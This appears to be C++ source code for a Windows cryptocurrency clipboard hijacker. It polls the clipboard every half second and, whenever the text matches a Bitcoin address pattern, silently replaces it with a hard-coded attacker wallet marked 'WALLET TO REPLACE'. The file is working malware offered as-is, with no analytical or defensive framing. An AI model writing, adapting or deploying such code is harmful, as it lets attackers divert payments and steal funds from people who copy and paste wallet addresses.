#include <Windows.h>
#include <iostream>
#include <regex>

using namespace std;


void setClipboardText(const char* text) {
    int size = ::MultiByteToWideChar(CP_UTF8, 0, text, -1, nullptr, 0);
    if (size < 0) {
        return;
    }

    if (::OpenClipboard(NULL)) {
        ::EmptyClipboard();
        HGLOBAL hGlobal = ::GlobalAlloc(GMEM_ZEROINIT | GMEM_MOVEABLE | GMEM_DDESHARE, (size + 1) * sizeof(WCHAR));
        if (hGlobal != NULL) {
            LPWSTR lpszData = (LPWSTR)::GlobalLock(hGlobal);
            if (lpszData != nullptr) {
                ::MultiByteToWideChar(CP_UTF8, 0, text, -1, lpszData, size);
                ::GlobalUnlock(hGlobal);
                ::SetClipboardData(CF_UNICODETEXT, hGlobal);
            }
        }
        ::CloseClipboard();
    }
}

int main()
{
    // Continuously read the clipboard
    HGLOBAL clipbuffer;
    while (true)
    {    
        OpenClipboard(0);
        HANDLE data = GetClipboardData(CF_TEXT);
        if (regex_match((char*)data, regex("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$"))) {
            if(OpenClipboard(0))
            {
                const char* myWallet = "32AuPJ7Fg3MDX78vpKZB9xSnp3i1y5Dd7T"; // WALLET TO REPLACE
                setClipboardText(myWallet);
                
            }
        }
        CloseClipboard();
        Sleep(500);
    }

    return 0;
}